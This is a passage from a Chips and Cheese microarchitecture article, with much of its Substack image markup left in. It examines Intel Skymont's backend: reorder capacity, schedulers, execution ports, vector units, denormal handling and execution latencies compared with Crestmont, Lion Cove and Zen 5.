https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff0845404-e10b-4892-8cba-d222a73851ec_1072x444.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff0845404-e10b-4892-8cba-d222a73851ec_1072x444.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff0845404-e10b-4892-8cba-d222a73851ec_1072x444.png" width="688" height="285" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f0845404-e10b-4892-8cba-d222a73851ec_1072x444.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:285,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32575&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff0845404-e10b-4892-8cba-d222a73851ec_1072x444.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff0845404-e10b-4892-8cba-d222a73851ec_1072x444.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff0845404-e10b-4892-8cba-d222a73851ec_1072x444.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff0845404-e10b-4892-8cba-d222a73851ec_1072x444.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Other structures have to be sized appropriately because the rename/allocate stage is in-order, and will stall the moment it hits an instruction it can’t allocate resources for. Skymont’s register files and store queue see substantial size increases, though not by as much as ROB capacity growth.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04d7c771-f211-477a-8087-4cc0633aab95_1061x451.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04d7c771-f211-477a-8087-4cc0633aab95_1061x451.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04d7c771-f211-477a-8087-4cc0633aab95_1061x451.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04d7c771-f211-477a-8087-4cc0633aab95_1061x451.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04d7c771-f211-477a-8087-4cc0633aab95_1061x451.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04d7c771-f211-477a-8087-4cc0633aab95_1061x451.png" width="1061" height="451" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/04d7c771-f211-477a-8087-4cc0633aab95_1061x451.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:451,&quot;width&quot;:1061,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:72372,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04d7c771-f211-477a-8087-4cc0633aab95_1061x451.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04d7c771-f211-477a-8087-4cc0633aab95_1061x451.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04d7c771-f211-477a-8087-4cc0633aab95_1061x451.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F04d7c771-f211-477a-8087-4cc0633aab95_1061x451.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Crestmont had generously sized register files capable of covering the majority of its ROB capacity. Intel may have decided that was overkill, and rebalanced Skymont’s backend resources to increase reordering capacity in a more efficient way.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32583" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F507b0d8b-fe0c-427e-906c-9e485a8eed9b_708x510.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F507b0d8b-fe0c-427e-906c-9e485a8eed9b_708x510.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F507b0d8b-fe0c-427e-906c-9e485a8eed9b_708x510.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F507b0d8b-fe0c-427e-906c-9e485a8eed9b_708x510.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F507b0d8b-fe0c-427e-906c-9e485a8eed9b_708x510.png" width="688" height="496" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/507b0d8b-fe0c-427e-906c-9e485a8eed9b_708x510.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:496,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32583&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F507b0d8b-fe0c-427e-906c-9e485a8eed9b_708x510.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F507b0d8b-fe0c-427e-906c-9e485a8eed9b_708x510.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F507b0d8b-fe0c-427e-906c-9e485a8eed9b_708x510.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F507b0d8b-fe0c-427e-906c-9e485a8eed9b_708x510.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>An interesting example is Skymont’s reordering capacity for branches, which has dropped compared to Crestmont. A 96 entry branch order buffer can cover 23% of Skymont’s ROB capacity. I wonder if Intel might be cutting it a bit close here, because a couple of SPEC CPU2017 integer workloads have more frequent branches than that. But Intel’s engineers are obviously looking at more than just SPEC, and I trust they know what they’re doing.</p><p>Compared to Crestmont, Skymont’s integer schedulers grow from 16 to 20 entries. There are still four schedulers, but each now has two ports instead of one, letting them feed an extra integer ALU. That doubles Skymont’s throughput for basic operations like integer adds compared to Crestmont.</p><p><span>Back in an </span><a href="https://chipsandcheese.com/2024/07/15/a-video-interview-with-mike-clark-chief-architect-of-zen-at-amd/" rel="">interview</a><span> with Cheese, AMD’s Mike Clark mentioned a unified scheduler can avoid situations where several ops become ready on one scheduling queue, but have to sit in line for that queue’s ALU port. I wonder if putting two ALU ports on each queue is a way around that. If three ALU ops suddenly become ready on one of Skymont’s schedulers, they would start execution over two cycles instead of three.</span></p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32637" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee8ee3ab-e1ab-4b76-95e3-1f595849ae9a_781x360.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee8ee3ab-e1ab-4b76-95e3-1f595849ae9a_781x360.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee8ee3ab-e1ab-4b76-95e3-1f595849ae9a_781x360.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee8ee3ab-e1ab-4b76-95e3-1f595849ae9a_781x360.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee8ee3ab-e1ab-4b76-95e3-1f595849ae9a_781x360.png" width="688" height="317" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/ee8ee3ab-e1ab-4b76-95e3-1f595849ae9a_781x360.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:317,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32637&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee8ee3ab-e1ab-4b76-95e3-1f595849ae9a_781x360.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee8ee3ab-e1ab-4b76-95e3-1f595849ae9a_781x360.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee8ee3ab-e1ab-4b76-95e3-1f595849ae9a_781x360.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fee8ee3ab-e1ab-4b76-95e3-1f595849ae9a_781x360.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Less commonly used units like integer multipliers and shifters were not scaled up, and execution throughput for those operations remains similar to Crestmont. Skymont however has improved 64-bit integer multiplication latency, which drops from 5 to 4 cycles. It’s not as fast as Zen 5’s 3 cycles, but it’s good to see Intel find ways to cut pipeline stages here and there.</p><p>Skymont gains an extra branch port, letting it handle three not-taken branches per cycle. Throughput for taken branches is still limited to one per cycle because the branch predictor can’t go any faster.</p><p>Floating point and vector execution has never been a strength of Intel’s E-Core line, but Skymont does get substantial upgrades. It now has a quad-pipe FPU. All four pipes can handle basic floating point and integer vector instructions, creating a setup reminiscent of Cortex X2 or Qualcomm Oryon’s. Compared to Crestmont, Intel has grown both the scheduling and non-scheduling queues by a significant amount.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32628" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b0a7f5f-1a16-4750-9971-f144141df403_900x546.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b0a7f5f-1a16-4750-9971-f144141df403_900x546.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b0a7f5f-1a16-4750-9971-f144141df403_900x546.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b0a7f5f-1a16-4750-9971-f144141df403_900x546.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b0a7f5f-1a16-4750-9971-f144141df403_900x546.png" width="688" height="417" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/5b0a7f5f-1a16-4750-9971-f144141df403_900x546.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:417,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32628&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b0a7f5f-1a16-4750-9971-f144141df403_900x546.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b0a7f5f-1a16-4750-9971-f144141df403_900x546.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b0a7f5f-1a16-4750-9971-f144141df403_900x546.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F5b0a7f5f-1a16-4750-9971-f144141df403_900x546.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>As before, execution units remain 128-bits wide and 256-bit instructions execute as two micro-ops. A 256-bit vector result will also consume two 128-bit entries in the vector register file. Scheduling capacity for 256-bit operations remains mediocre despite what the numbers above would imply.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32634" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b6ace75-fa65-4ed3-b2f1-21e33dcc59b2_913x426.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b6ace75-fa65-4ed3-b2f1-21e33dcc59b2_913x426.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b6ace75-fa65-4ed3-b2f1-21e33dcc59b2_913x426.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b6ace75-fa65-4ed3-b2f1-21e33dcc59b2_913x426.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b6ace75-fa65-4ed3-b2f1-21e33dcc59b2_913x426.png" width="688" height="321" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/6b6ace75-fa65-4ed3-b2f1-21e33dcc59b2_913x426.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:321,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32634&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b6ace75-fa65-4ed3-b2f1-21e33dcc59b2_913x426.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b6ace75-fa65-4ed3-b2f1-21e33dcc59b2_913x426.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b6ace75-fa65-4ed3-b2f1-21e33dcc59b2_913x426.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F6b6ace75-fa65-4ed3-b2f1-21e33dcc59b2_913x426.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><span>Some of the microbenchmark runs targeting Skymont’s FP/vector unit, using variations of Henry Wong’s </span><a href="https://blog.stuffedcow.net/2013/05/measuring-rob-capacity/" rel="">methodology</a><span> to measure structure sizes</span></figcaption></figure></div><p><span>From measurements, it feels like </span><code>vaddps</code><span>‘s micro-ops can’t get into the non-scheduling queue the way scalar </span><code>addss</code><span> ones can. So, scheduling capacity for those 256-bit packed FP adds is half of the scheduler capacity. It’s better than Crestmont, where I could get 23 </span><code>vaddps</code><span> instructions in flight. That measurement suggests Crestmont is using its non-scheduling queue, though not to its fullest extent.</span></p><p><span>I thought that could be a restriction with instructions that have to be broken into two micro-ops. However, </span><code>cvtsi2ss</code><span> (convert integer to floating point) is handled as a single micro-op and can’t use the non-scheduling queue on either architecture. Perhaps something about Intel’s non-scheduling queue prevents it from being used in certain situations.</span></p><h5>Denormal Behavior</h5><p><span>We </span><a href="https://chipsandcheese.com/2024/06/15/intel-details-skymont/" rel="">previously covered Intel’s presentation on Skymont</a><span>, where they discussed improved denormal handling to prevent “glass jaw” performance behavior. From testing on Skymont, there is indeed no penalty when an operation on normalized floating point numbers produces a subnormal result.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F53906198-a6aa-4c45-9d27-4965c822c371_1063x342.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F53906198-a6aa-4c45-9d27-4965c822c371_1063x342.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F53906198-a6aa-4c45-9d27-4965c822c371_1063x342.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F53906198-a6aa-4c45-9d27-4965c822c371_1063x342.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F53906198-a6aa-4c45-9d27-4965c822c371_1063x342.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F53906198-a6aa-4c45-9d27-4965c822c371_1063x342.png" width="1063" height="342" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/53906198-a6aa-4c45-9d27-4965c822c371_1063x342.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:342,&quot;width&quot;:1063,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:50508,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F53906198-a6aa-4c45-9d27-4965c822c371_1063x342.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F53906198-a6aa-4c45-9d27-4965c822c371_1063x342.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F53906198-a6aa-4c45-9d27-4965c822c371_1063x342.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F53906198-a6aa-4c45-9d27-4965c822c371_1063x342.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Curiously, Lion Cove has not received the same fast-path denormal handling hardware. This sort of &gt;100 cycle penalty above can be easily avoided by disabling denormal handling via the flush-to-zero and denormals-are-zero flags. But it’s funny that Intel’s P-Cores have a “glass jaw” corner case that E-Cores now handle quite well.</p><h5>Execution Latency</h5><p>Skymont brings floating point execution latencies down across the board. As with Crestmont, there’s no latency penalty for using 256-bit vectors over 128-bit ones. 256-bit vector integer operations could sometimes see extra latency on Crestmont, possibly because it had an odd number of vector integer ALUs. Skymont improves there, and has no problem achieving single cycle latency for vector integer adds.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57596407-fb2e-4939-bbd0-a380aa3ab870_1067x362.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57596407-fb2e-4939-bbd0-a380aa3ab870_1067x362.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57596407-fb2e-4939-bbd0-a380aa3ab870_1067x362.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57596407-fb2e-4939-bbd0-a380aa3ab870_1067x362.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57596407-fb2e-4939-bbd0-a380aa3ab870_1067x362.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57596407-fb2e-4939-bbd0-a380aa3ab870_1067x362.png" width="1067" height="362" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/57596407-fb2e-4939-bbd0-a380aa3ab870_1067x362.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:362,&quot;width&quot;:1067,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:52182,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57596407-fb2e-4939-bbd0-a380aa3ab870_1067x362.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57596407-fb2e-4939-bbd0-a380aa3ab870_1067x362.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57596407-fb2e-4939-bbd0-a380aa3ab870_1067x362.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57596407-fb2e-4939-bbd0-a380aa3ab870_1067x362.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Floating point division is not pipelined and has an average latency of 2.5 cycles on Skymont. That’s a match for Zen 5, 